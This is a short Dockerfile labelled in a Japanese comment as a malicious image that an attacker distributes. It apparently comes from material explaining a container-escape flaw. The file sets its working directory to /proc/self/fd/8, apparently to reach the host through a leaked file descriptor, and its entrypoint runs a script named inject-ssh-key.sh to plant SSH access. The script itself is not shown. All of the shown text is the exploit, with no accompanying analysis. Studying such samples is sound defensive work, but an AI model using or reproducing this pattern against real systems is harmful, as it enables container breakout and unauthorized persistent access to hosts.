# 攻撃者がどこかで配信している悪意あるDockerfile
FROM debian:bookworm-20240130
WORKDIR /proc/self/fd/8
COPY ./inject-ssh-key.sh /tmp/inject-ssh-key.sh
ENTRYPOINT [ "/tmp/inject-ssh-key.sh" ]
